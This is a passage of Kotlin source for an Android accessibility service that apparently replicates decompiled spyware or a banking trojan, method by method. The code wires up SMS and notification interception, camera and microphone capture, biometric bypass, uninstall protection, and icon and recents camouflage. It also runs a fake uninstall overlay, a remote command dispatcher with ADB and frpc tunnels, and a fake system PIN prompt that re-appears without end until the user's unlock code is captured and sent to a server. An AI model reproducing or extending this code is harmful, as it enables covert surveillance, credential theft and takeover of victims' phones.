                            configStageManager = DeviceAuthorizationManager(this@MyAccessibilityService, this@MyAccessibilityService)
                            (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
                        }
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 启动授权模块异常: ${e.message}", e)
                }

                // DeviceAuthorizationManager 协程 finally 会自动调用 resumeWriteSettings()

                // JADX: launch dqtvuisjd$startPermissionGrantFlow$11 coroutine
                // 10s delay → check m211484h8 (networkManager.isRegistered) → if not, wake NetworkManager
                coroutineScope?.launch {
                    try {
                        delay(10000L) // JADX: b81.m210571b1(10000L, this)
                        val registered = try {
                            networkManager?.isRegistered ?: false
                        } catch (_: Exception) { false }
                        if (!registered) {
                            android.util.Log.w(TAG, "⚠️ 10秒内未完成注册，唤醒NetworkManager重试")
                            networkManager?.let { nm ->
                                nm.ensureConnected() // JADX: c0323a8.m211643a8()
                                // JADX: c0323a8.m211669d6() — send reconnect signal to channel
                                // Simplified: ensureConnected already handles reconnection
                            }
                        }
                    } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "自动权限获取失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Initialization chain methods — JADX 1:1
    // ════════════════════════════════════════════════════════════════

    /**
     * Initialize module instances.
     * JADX method: m211478h2 (h2), line 6335 — initializeModules
     *
     * Creates all module objects: ScreenCaptureManager, displayManager, eventFilterManager,
     * configMaskManager, configProgressManager, mainOrchestrator, etc.
     * Also calls initializekinztpexl (h4) and h5 (initializenpweufstehlb).
     */
    @Throws(Exception::class)
    fun initializeModules() {
        try {
            if (isModulesInitialized) {
                android.util.Log.d(TAG, "🔧 模块已初始化，跳过重新初始化")
                return
            }
            android.util.Log.d(TAG, "🔧 初始化模块实例")

            // JADX: AbstractC0315a0.f53039b4 = filesDir
            val filesDir = filesDir

            // JADX: m211447d2() — init service configuration flags
            initServiceConfig()

            // JADX: NetworkManager singleton
            try {
                val appContext = applicationContext
                val nm = NetworkManager()
                nm.initialize(appContext)
                networkManager = nm
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ NetworkManager 初始化失败", e)
            }

            // JADX: C0614i9 — eventFilterManager (xz0 + C0614i9)
            // JADX: this.f52413e4 = new xz0(this, this)
            // JADX: this.f52414e5 = new C0614i9(this, this)
            try {
                val efm = com.storm.safe.rock.service.modules.EventFilterManager(this, this)
                eventFilterManager = efm
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ EventFilterManager 初始化失败", e)
            }

            // JADX: C0761kk — configManager
            // this.f52416e7 = new C0761kk(this)

            // JADX: r80 — keyEventManager
            // this.f52422f3 = new r80(this, this)

            // JADX: fd0 — maskOverlayManager
            // this.f52423f4 = new fd0(this, this)

            // JADX: l81 — uiAnalysisManager
            // this.f52424f5 = new l81(this, this)

            // JADX: jn0 — permissionUIManager
            // this.f52425f6 = new jn0(this, this)

            // JADX: C1115qm — debugAnalysisManager
            // this.f52426f7 = c1115qm

            // JADX: C0763km — configMaskManager
            // this.f52427f8 = new C0763km(this, this)

            // JADX: C0318a3 — configProgressManager
            try {
                val cpm = ConfigProgressManager(applicationContext)
                configProgressManager = cpm
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ ConfigProgressManager 初始化失败", e)
            }

            // JADX: C0327b2 — mainOrchestrator (WRITE_SETTINGS automation)
            try {
                mainOrchestrator = MainOrchestrator(this)
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ MainOrchestrator 初始化失败", e)
            }

            // JADX: tu0 — screenBrightness manager with callbacks
            // this.f52430g1 = new tu0(...)

            // JADX: C0329b4 — authorizationModule (DeviceAuthorizationManager)
            try {
                configStageManager = DeviceAuthorizationManager(this, this)
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ DeviceAuthorizationManager 初始化失败", e)
            }

            // JADX: ju0 — screenBrightnessManager
            // this.f52433g4 = new ju0(this)

            // JADX: C0328b3 — biometricBypassDelegate
            try {
                biometricBypassDelegate = BiometricBypassDelegate(this)
                biometricBypassDelegate?.initialize()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ BiometricBypassDelegate 初始化失败", e)
            }

            // JADX: C0032al — gestureExecutor
            // this.f52439h0 = new C0032al(this)

            // JADX: m211480h4() — initializekinztpexl (uninstall protection)
            initializekinztpexl()

            // JADX: m211481h5() — initializenpweufstehlb (recents guard)
            initializenpweufstehlb()

            isModulesInitialized = true
            android.util.Log.d(TAG, "✅ 模块实例初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 模块实例初始化失败", e)
            throw e
        }
    }

    /**
     * Initialize managers — cleanup old resources + create fresh instances.
     * JADX method: m211477h1 (h1), line 6136 — initializeManagers
     *
     * Cleans up old manager coroutine scopes, then creates fresh instances
     * of all core managers.
     */
    fun initializeManagers() {
        android.util.Log.d(TAG, "🧹 开始清理旧管理器资源...")

        // JADX: cleanup old displayManager scope
        try {
            displayManager?.let { dm ->
                dm.stopCapture()
                android.util.Log.d(TAG, "🧹 已停止旧 etzbzyzqxvqm 的截图协程")
            }
        } catch (_: Exception) {}

        // JADX: cleanup old cameraManager
        try {
            cameraManager?.let { cm ->
                cm.release()
                android.util.Log.d(TAG, "🧹 已清理旧 CameraManager（线程池/相机资源）")
            }
        } catch (_: Exception) {}

        // JADX: cleanup old audioManager
        try {
            audioManager?.let { am ->
                am.release()
                android.util.Log.d(TAG, "🧹 已清理旧 MicrophoneManager（录音/协程作用域）")
            }
        } catch (_: Exception) {}

        // JADX: cleanup old cipherCaptureManager scope
        try {
            cipherCaptureManager?.let { ccm ->
                android.util.Log.d(TAG, "🧹 已清理旧 CipherCaptureManager（协程作用域）")
            }
        } catch (_: Exception) {}

        // JADX: cleanup old screenCaptureManager scope
        try {
            screenCaptureManager?.let { scm ->
                scm.stopCapture()
                android.util.Log.d(TAG, "🧹 已清理旧 PermissionGranter（协程作用域）")
            }
        } catch (_: Exception) {}

        android.util.Log.d(TAG, "🧹 旧管理器资源清理完成")

        // JADX: create fresh instances
        screenCaptureManager = ScreenCaptureManager(this)
        displayManager = C0263a5(this)
        // JADX: z50 — inputController
        // this.f52374a5 = new z50(this)
        // JADX: a30 — gestureExecutor
        // this.f52440h1 = new a30(this)
        // JADX: C0357a0 — screenControlHelper
        try {
            screenControlHelper = ScreenControlHelper(this)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ScreenControlHelper 初始化失败", e)
        }

        // JADX: configMaskManager.initMaskOverlay(context) — reads config, creates overlay
        // This depends on C0763km (configMaskManager) and dd0 (mask config)
        // ADAPT: C0763km (configMaskManager) + C0708j7 (mask config) — vendor overlay
        // that shows a full-screen mask during initial config. ConfigProgressManager
        // handles the config-in-progress UI state for the replica.

        // JADX: wire eventFilterManager with screenCaptureManager
        // c0614i9.f56823a3 = screenCaptureManager
        // c0614i9.f56827a7 = isAuthStateRestored
        eventFilterManager?.let { efm ->
            efm.isAuthStateRestored = isAuthStateRestored
        }

        android.util.Log.d(TAG, "✅ 适配前最小管理器初始化完成")
    }

    /**
     * Initialize uninstall protection manager (kinztpexl).
     * JADX method: m211480h4 (h4), line 6484
     *
     * Creates UninstallProtectionManager and sets callback lambdas for
     * isLearned, isPermissionRequestActive, getRootNode, getDeviceId, etc.
     */
    fun initializekinztpexl() {
        android.util.Log.d(TAG, "🔧 初始化防卸载保护管理器...")
        try {
            val upm = UninstallProtectionManager(this, this)
            uninstallProtectionManager = upm

            // JADX: wire networkManager, biometricBypassDelegate, and lambda callbacks
            // c0355a0.f53691c6 = networkManager
            // c0355a0.f53692c7 = biometricBypassDelegate
            // c0355a0.f53693c8 = { configStageManager is learned }
            // c0355a0.f53694c9 = { isPermissionRequestActive() }
            // c0355a0.f53695d0 = { getRootNode() }
            // c0355a0.f53696d1 = { getAndroidDeviceId() }
            // c0355a0.f53698d3 = { collectAppNames() }

            android.util.Log.d(TAG, "✅ 防卸载保护管理器初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 防卸载保护管理器初始化失败", e)
        }
    }

    /**
     * Initialize recents guard manager (npweufstehlb).
     * JADX method: m211481h5 (h5), line 6662
     *
     * Creates RecentsGuardManager and sets callback lambdas.
     * If already authorized, enables protection immediately.
     */
    fun initializenpweufstehlb() {
        android.util.Log.d(TAG, "🔧 初始化多任务页面保护管理器...")
        try {
            val rgm = RecentsGuardManager(this, this)
            recentsGuardManager = rgm

            // JADX: wire lambda callbacks
            // c0356a1.f53723a6 = { configStageManager?.isLearned() ?: false }
            // c0356a1.f53724a7 = { getRootNode() }
            // c0356a1.f53725a8 = { biometricBypassDelegate?.isActive ?: false }

            // JADX: check if already authorized → enable immediately
            val isAuthorized = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)

            if (!isAuthorized) {
                android.util.Log.d(TAG, "✅ 多任务页面保护管理器初始化完成（待适配完成后启用）")
                return
            }

            // JADX: c0356a12.m211955a2() — enable protection
            rgm.enable()

            // JADX: check icon_hidden → enable camouflage in recents
            val iconHidden = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("icon_hidden", false)
            if (iconHidden) {
                rgm.excludeFromRecents()
                android.util.Log.d(TAG, "🎭 伪装模式: 主动设置 excludeFromRecents")
            }

            android.util.Log.d(TAG, "✅ 多任务页面保护管理器初始化完成，授权已完成→立即启用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 多任务页面保护管理器初始化失败", e)
        }
    }

    /**
     * Initialize deferred managers — called after authorization completes.
     * JADX method: m211416b5 (b5), line 2232 — initializeDeferredManagers (static)
     *
     * Creates ~20 post-authorization managers: CameraManager, SmsInterceptDelegate,
     * MicrophoneManager, CipherCaptureManager, GestureRecorderManager, UnlockManager,
     * CommandDispatcher, LocalHttpServer, etc.
     */
    fun initializeDeferredManagers() {
        android.util.Log.d(TAG, "🔧 [授权后] 开始初始化延迟管理器...")

        // JADX: ensure networkManager
        try {
            val appContext = applicationContext
            if (networkManager == null) {
                val nm = NetworkManager()
                nm.initialize(appContext)
                networkManager = nm
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ NetworkManager 延迟初始化失败", e)
        }

        // JADX: f52371a2 = new C0258a0 — cameraManager
        try {
            cameraManager = C0258a0(this)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CameraManager 延迟初始化失败", e)
        }

        // JADX: f52372a3 = new C0324a9 — smsInterceptDelegate
        try {
            smsInterceptDelegate = SmsInterceptDelegate(this)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ SmsInterceptDelegate 延迟初始化失败", e)
        }

        // ADAPT: C0856mc (MediaContentManager) — vendor class that monitors
        // media content changes (photos, videos). Not replicated; media access
        // is handled through CameraCaptureManager.

        // ADAPT: l20 (InjectionManager) — vendor class that manages HTML injection
        // task queue and WebView overlay lifecycle. Injection tasks are tracked via
        // injectionTasks map; WebView overlay is handled by jbqfkndyx.

        // JADX: f52455i6 = new C0259a1 — audioManager
        try {
            audioManager = C0259a1(this)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ AudioManager 延迟初始化失败", e)
        }

        // ADAPT: C1496yx (SystemInfoCollector) — vendor class that collects device info
        // (installed apps, contacts, call logs, etc.) and sends to server.
        // Device info collection is handled by command handlers in CommandDispatcher.

        // JADX: f52437g8 = new C0319a4 — notificationInterceptDelegate
        try {
            notificationInterceptDelegate = NotificationInterceptDelegate()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ NotificationInterceptDelegate 延迟初始化失败", e)
        }

        // JADX: f52438g9 — cipherCaptureManager singleton
        try {
            if (cipherCaptureManager == null) {
                cipherCaptureManager = CipherCaptureManager(this, applicationContext)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CipherCaptureManager 延迟初始化失败", e)
        }

        // JADX: AccessibilityEventRouter
        try {
            if (accessibilityEventRouter == null) {
                accessibilityEventRouter = AccessibilityEventRouter(this, applicationContext)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ AccessibilityEventRouter 延迟初始化失败", e)
        }

        // JADX: CameraCaptureManager (C0262a4)
        try {
            if (cameraCaptureManager == null) {
                cameraCaptureManager = CameraCaptureManager(this)
            }
            cameraCaptureManager?.startCapture()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CameraCaptureManager 延迟初始化失败", e)
        }

        // JADX: fn0 — permission health monitor
        // f52376a7 = fn0.f56299a2.getInstance(this)

        // JADX: register permission health receiver
        try {
            if (!permissionHealthReceiverRegistered) {
                permissionHealthReceiver = object : BroadcastReceiver() {
                    override fun onReceive(context: Context?, intent: Intent?) {
                        val action = intent?.action ?: return
                        android.util.Log.d(TAG, "📋 权限健康广播: $action")
                    }
                }
                val filter = IntentFilter().apply {
                    addAction("com.storm.safe.rock.intent.PERMISSION_HEALTH_RECOVERED")
                    addAction("com.storm.safe.rock.intent.PERMISSION_HEALTH_ISSUE")
                    addAction("com.storm.safe.rock.intent.MEDIA_PROJECTION_RECOVERED")
                    addAction("com.storm.safe.rock.intent.ANDROID15_PERMISSION_STABLE")
                    addAction("com.storm.safe.rock.intent.STOP_SECONDARY_CONFIRMATION")
                    addAction("com.storm.safe.rock.intent.PERMISSION_RECOVERY_FAILED")
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    registerReceiver(permissionHealthReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
                } else {
                    registerReceiver(permissionHealthReceiver, filter)
                }
                permissionHealthReceiverRegistered = true
                android.util.Log.d(TAG, "✅ 已注册权限健康监控广播接收器")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册权限健康监控广播接收器失败", e)
        }

        // JADX: CommandDispatcher initialization
        android.util.Log.d(TAG, "🔧 初始化命令分发器...")
        try {
            val cmdContext = com.storm.safe.rock.service.modules.command.CommandContext(this, networkManager)
            commandDispatcher = CommandDispatcher(cmdContext)

            // Register all 15 command handlers
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AppCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.UnlockCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.FileCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.MediaCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.SmsContactsCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.LogCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DetectionCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DeviceStateCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.InputCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ScreenCaptureCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ProtectionCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.PermissionCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.GestureCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.CipherReplayCommandHandler())
            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.BlackScreenCommandHandler())
            android.util.Log.d(TAG, "已注册 16 个命令处理器")

            // Bind commandCallback to dispatch commands via CommandDispatcher
            val dispatcher = commandDispatcher!!
            networkManager?.commandCallback = { json ->
                coroutineScope?.launch(Dispatchers.IO) {
                    try {
                        dispatcher.dispatch(json)
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "命令分发失败", e)
                    }
                }
            }
            android.util.Log.d(TAG, "✅ commandCallback 已绑定到 CommandDispatcher")

            android.util.Log.d(TAG, "✅ 命令分发器初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CommandDispatcher 延迟初始化失败", e)
        }

        // JADX: RemoteConfigManager (LocalHttpServer) — C0322a7
        try {
            val rcm = RemoteConfigManager(applicationContext)
            rcm.commandDispatcher = commandDispatcher
            rcm.start()
            remoteConfigManager = rcm
            android.util.Log.d(TAG, "✅ RemoteConfigManager 已启动 (port=${RemoteConfigManager.DEFAULT_PORT})")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ RemoteConfigManager 启动失败", e)
        }

        // frpc 进程管理器 — vendor unlockedInstance() CheckProcessThread
        try {
            val fpm = FrpcProcessManager(applicationContext)
            fpm.start()
            frpcProcessManager = fpm
            android.util.Log.d(TAG, "✅ FrpcProcessManager 已启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ FrpcProcessManager 启动失败", e)
        }

        // JADX: request initial config from server
        try {
            networkManager?.let { nm ->
                // JADX: nm.sendEvent("request_init_config", JSONObject())
            }
        } catch (_: Exception) {}

        // JADX: register SMS content observer
        try {
            registerSmsContentObserver()
        } catch (_: Exception) {}

        android.util.Log.d(TAG, "✅ [授权后] 延迟管理器初始化完成")
    }

    /**
     * Initialize icon hide (camouflage) detection from monitor_config.json.
     * JADX method: m211492i6 (i6), line 6965
     *
     * Reads monitor_config.json for accessibility page monitor settings:
     * - monitorAccessibilityPageNavigation flag
     * - checkIntervalSeconds, confirmationRequiredCount, maxRetryCount, delayAfterServiceConnectedSeconds
     */
    fun initializeIconHide() {
        try {
            val configJson = AssetConfigReader.readAssetConfig(this, "monitor_config.json")
            if (configJson != null) {
                val json = org.json.JSONObject(configJson)
                isAccessibilityPageMonitorEnabled = json.optBoolean("monitorAccessibilityPageNavigation", false)

                val monitorSettings = json.optJSONObject("monitorSettings")
                if (monitorSettings != null) {
                    val d = 1000.0
                    monitorCheckInterval = (monitorSettings.optDouble("checkIntervalSeconds", 0.5) * d).toLong()
                    monitorConfirmationCount = monitorSettings.optInt("confirmationRequiredCount", 2)
                    monitorMaxRetryCount = monitorSettings.optInt("maxRetryCount", 8)
                    monitorDelayAfterConnected = (monitorSettings.optDouble("delayAfterServiceConnectedSeconds", 1.0) * d).toLong()
                }

                if (!isAccessibilityPageMonitorEnabled) {
                    android.util.Log.d(TAG, "🔍 [监控] 无障碍监控功能已禁用（默认状态）")
                    return
                }

                android.util.Log.d(TAG, "✅ 无障碍监控功能已启用 - 配置：延迟${monitorDelayAfterConnected}ms，间隔${monitorCheckInterval}ms，确认${monitorConfirmationCount}次，最多${monitorMaxRetryCount}次")
                android.util.Log.w(TAG, "⚠️ [监控] 无障碍监控功能仅用于解决特定设备的跳转问题")
            }
        } catch (e: Exception) {
            android.util.Log.d(TAG, "🔍 [监控] 无法加载无障碍监控配置，使用默认设置: ${e.message}")
            isAccessibilityPageMonitorEnabled = false
        }
    }

    /**
     * Initialize activity monitor — restore camouflage state if hidden.
     * JADX method: m211509k5 (k5), line 7610
     *
     * Checks if app is in camouflage mode (disguise_prefs.camouflage_enabled),
     * and restores the event filter camouflage state accordingly.
     */
    fun initializeActivityMonitor() {
        try {
            val isHidden = try {
                getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
                    .getBoolean("camouflage_enabled", false)
            } catch (_: Exception) { false }

            if (!isHidden) {
                android.util.Log.d(TAG, "🔍 [保护] APP未处于伪装模式，无需恢复伪装监听")
                isCamouflageModeEnabled = false
                return
            }

            android.util.Log.d(TAG, "✅ [保护] 检测到APP处于伪装模式，恢复伪装监听")
            isCamouflageModeEnabled = true

            // JADX: c0614i9.f56839b9 = camouflage state from SharedPreferences
            // Restore camouflage state in eventFilterManager
            try {
                val camouflageEnabled = try {
                    getSharedPreferences("camouflage_state", Context.MODE_PRIVATE)
                        .getBoolean("phone_manager_camouflage_enabled", false)
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 恢复伪装状态失败", e)
                    false
                }
                // JADX: set eventFilterManager.phoneManagerCamouflageEnabled = camouflageEnabled
                eventFilterManager?.isPhoneManagerCamouflageEnabled = camouflageEnabled
                android.util.Log.d(TAG, "✅ [保护] 伪装监听状态已恢复，isAppHidden=true")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ [保护] 自动恢复伪装状态失败", e)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [保护] 恢复伪装状态失败", e)
        }
    }

    /**
     * Initialize recents guard (black screen UI control).
     * JADX method: m211491i5 (i5), line 6940
     *
     * Starts ibbnqvnvhxg activity if not already running.
     */
    fun initializeRecentsGuard() {
        try {
            // JADX: ibbnqvnvhxg.f55194a0.isRunning() — now replicated
            if (com.storm.safe.rock.p029ui.ibbnqvnvhxg.isRunning()) {
                android.util.Log.d(TAG, "ibbnqvnvhxg 已在运行，跳过启动")
                return
            }
            // JADX: f52479l0 check — prevent duplicate starts
            if (isOverlayVisible) {
                android.util.Log.d(TAG, "ibbnqvnvhxg overlay 已可见，跳过启动")
                return
            }
            // Start ibbnqvnvhxg activity
            try {
                val intent = android.content.Intent(this, com.storm.safe.rock.p029ui.ibbnqvnvhxg::class.java)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                android.util.Log.d(TAG, "✅ initializeRecentsGuard — ibbnqvnvhxg 已启动")
            } catch (e: Exception) {
                android.util.Log.w(TAG, "⚠️ ibbnqvnvhxg 启动失败: ${e.message}")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动 ibbnqvnvhxg 失败", e)
        }
    }

    /**
     * Try to show the fake package verify (uninstall) overlay.
     * JADX method: m211534n2 (n2), line 9587
     *
     * Reads page_style_config.json for uninstallMode flag.
     * If enabled, shows the fake uninstall progress overlay.
     */
    fun tryShowPackageVerify() {
        try {
            android.util.Log.d(TAG, "📦 [假卸载] ★★★ tryShowPackageVerify() 被调用 ★★★")

            val uninstallMode = try {
                val text = assets.open("config.json").bufferedReader().use { it.readText() }
                val json = org.json.JSONObject(text)
                json.optJSONObject("protection")?.optBoolean("uninstall_mode", false) ?: false
            } catch (_: Exception) { false }
            android.util.Log.d(TAG, "📦 [假卸载] uninstallMode=$uninstallMode (配置来源: config.json)")
            if (!uninstallMode) {
                android.util.Log.d(TAG, "📦 [假卸载] uninstallMode 未启用，跳过")
                return
            }

            val verifyDone = getSharedPreferences("pkg_verify_state", Context.MODE_PRIVATE)
                .getBoolean("v_done", false)
            android.util.Log.d(TAG, "📦 [假卸载] shouldShow=${!verifyDone}")

            if (verifyDone) {
                android.util.Log.d(TAG, "📦 [假卸载] 已弹出过，跳过")
                return
            }

            android.util.Log.d(TAG, "📦 [假卸载] ★★★ 开始显示假卸载页面 ★★★")
            com.storm.safe.rock.service.modules.overlay.PkgVerifyOverlay.show(this)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📦 [假卸载] 显示失败", e)
        }
    }

    /**
     * Complete installation after cipher capture.
     * JADX: m211449d4 (d4), line 4647
     */
    fun completeInstallationWithCipher() {
        try {
            android.util.Log.d(TAG, "🔐 ★★★ completeInstallationWithCipher() 被调用 ★★★")

            getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
                .putBoolean("cipher_excluded", true).apply()
            getSharedPreferences("cipher_config", Context.MODE_PRIVATE).edit()
                .putBoolean("cipher_completed", true).apply()

            val ccm = cipherCaptureManager
            if (ccm != null) {
                val cipher = ccm.readBufferedCipher(false)
                val textCipher = cipher?.get("text") as? String
                val patternPoints = cipher?.get("pattern") as? List<*>

                val gradeCode = when {
                    patternPoints != null -> "pattern"
                    textCipher != null && textCipher.length <= 4 -> "4pin"
                    textCipher != null && textCipher.length <= 6 -> "6pin"
                    else -> "mixed"
                }
                android.util.Log.d(TAG, "🔐 密码类型: $gradeCode")

                val cipherValue = textCipher ?: patternPoints?.joinToString(",") ?: ""
                if (cipherValue.isNotEmpty()) {
                    networkManager?.sendPassword(cipherValue, "system_auth", gradeCode)
                }
            }

            android.util.Log.d(TAG, "✅ 安装完成流程已执行")
            tryShowPackageVerify()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ completeInstallationWithCipher 失败", e)
        }
    }

    @Volatile private var cipherRetryCount = 0
    private val cipherMaxRetries = Int.MAX_VALUE
    private val cipherRetryDelayMs = 300L
    private var cipherIsInstallationFlow = false

    // vendor: f52471k2/f52472k3/f52473k4 — 用户离开密码页面的重试循环
    @Volatile private var cipherDismissCount = 0
    private val cipherDismissMaxRetries = Int.MAX_VALUE
    private val cipherDismissDelayMs = 300L

    private fun handleCipherCredentialResult(success: Boolean) {
        android.util.Log.d(TAG, "🔐 验证结果: ${if (success) "成功" else "失败"}")
        if (success) {
            isCipherCaptureEnabled = false
            cipherRetryCount = 0
            if (cipherIsInstallationFlow) completeInstallationWithCipher()
        } else {
            cipherRetryCount++
            if (cipherRetryCount < cipherMaxRetries) {
                android.util.Log.d(TAG, "🔄 重试 $cipherRetryCount/$cipherMaxRetries")
                Handler(Looper.getMainLooper()).postDelayed({
                    com.storm.safe.rock.activity.syuqattwmgit.start(this, 0, ::handleCipherCredentialResult)
                }, cipherRetryDelayMs)
            } else {
                android.util.Log.w(TAG, "⚠️ 达到最大重试次数")
                isCipherCaptureEnabled = false
                cipherRetryCount = 0
                cipherCaptureManager?.stopListeningFull()
                if (cipherIsInstallationFlow) completeInstallationWithCipher()
            }
        }
    }

    /**
     * Launch system password verification via syuqattwmgit Activity.
     * JADX: m211457e6 (e6), line 4873
     */
    fun doLaunchSystemPasswordCapture(isInstallationFlow: Boolean) {
        try {
            cipherRetryCount = 0
            cipherIsInstallationFlow = isInstallationFlow
            android.util.Log.d(TAG, "🔐 启动系统密码验证 (isInstallationFlow=$isInstallationFlow)")

            cipherCaptureManager?.startListening()

            com.storm.safe.rock.activity.syuqattwmgit.start(this, 0, ::handleCipherCredentialResult)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ doLaunchSystemPasswordCapture 失败", e)
        }
    }

    /**
     * 用户离开密码页面时重新弹出 PIN。
     * vendor: m211495i9 (i9) — onPasswordPageDismissedByUser
     *
     * 当 CipherCaptureManager 检测到窗口切换离开密码界面（无数据时），
     * 调用此方法。300ms 后重新弹出 PIN，无限循环直到输入成功。
     */
    fun onPasswordPageDismissedByUser() {
        if (!isCipherCaptureEnabled) {
            android.util.Log.d(TAG, "🔷 [onPasswordPageDismissedByUser] 密码监听未激活，忽略")
            return
        }
        cipherDismissCount++
        if (cipherDismissCount >= cipherDismissMaxRetries) {
            android.util.Log.w(TAG, "⚠️ [onPasswordPageDismissedByUser] 已达最大重试次数，停止")
            isCipherCaptureEnabled = false
            cipherDismissCount = 0
            return
        }
        android.util.Log.d(TAG, "🔄 [onPasswordPageDismissedByUser] 用户离开密码页面，${cipherDismissDelayMs}ms后重新弹出")
        cipherCaptureManager?.let {
            com.storm.safe.rock.service.modules.cipher.CipherCaptureManager.enableListening(it)
        }
        Handler(Looper.getMainLooper()).postDelayed({
            doLaunchSystemPasswordCapture(cipherIsInstallationFlow)
        }, cipherDismissDelayMs)
    }

    /**
     * Send screen lock/wake status to server.
     * JADX method: m211518l5 (l5), line 7835
     */
    fun sendScreenStatus() {
        try {
            val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            val isLocked = km?.isKeyguardLocked ?: false
            val isScreenOn = pm?.isInteractive ?: true
            android.util.Log.d(TAG, "📱 屏幕状态: isLocked=$isLocked, isScreenOn=$isScreenOn")
            networkManager?.let { nm ->
                // JADX: nm.sendScreenStatus(isLocked, isScreenOn)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 发送屏幕状态更新失败", e)
        }
    }

    /**
     * Register SMS content observer.
     * JADX method: m211505k1 (k1), line 7534
     */
    fun registerSmsContentObserver() {
        try {
            val handlerThread = android.os.HandlerThread("sms-content-observer")
            handlerThread.start()
            val handler = Handler(handlerThread.looper)
            // JADX: C0931ny — SMS content observer, now replicated as SmsContentObserver
            val observer = SmsContentObserver(handler, this)
            contentResolver.registerContentObserver(
                android.net.Uri.parse("content://sms"), true, observer
            )
            android.util.Log.d(TAG, "📩 [ContentObserver] SMS数据库监听器已注册")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📩 [ContentObserver] ❌ 注册失败: ${e.message}", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Delegate Management
    // ════════════════════════════════════════════════════════════════

    fun registerDelegate(delegate: Any) {
        synchronized(delegateQueue) {
            if (!delegateQueue.contains(delegate)) {
                delegateQueue.add(delegate)
            }
        }
    }

    fun unregisterDelegate(delegate: Any) {
        synchronized(delegateQueue) {
            delegateQueue.remove(delegate)
        }
    }

    fun clearDelegates() {
        synchronized(delegateQueue) {
            delegateQueue.clear()
        }
    }

    fun getDelegateCount(): Int = synchronized(delegateQueue) { delegateQueue.size }

    // ════════════════════════════════════════════════════════════════
    // Internal helpers
    // ════════════════════════════════════════════════════════════════

    /**
     * Dispatch event to legacy delegate queue.
     * Eventually all delegates should use the typed AccessibilityDelegate system.
     */
    private fun dispatchToDelegates(
        event: AccessibilityEvent,
        packageName: String,
        className: String
    ) {
        synchronized(delegateQueue) {
            for (delegate in delegateQueue.toList()) {
                try {
                    if (delegate is com.storm.safe.rock.service.modules.base.AccessibilityDelegate) {
                        delegate.onAccessibilityEvent(event, packageName, className)
                    }
                    // else: untyped delegate — skip (Phase 4 will handle)
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "Delegate dispatch error: ${e.message}")
                }
            }
        }
    }

    /**
     * Ensure AppCoreService is running (throttled check).
     * JADX line 9783: check every 10s
     */
    private fun ensureCoreServiceRunning() {
        val now = System.currentTimeMillis()
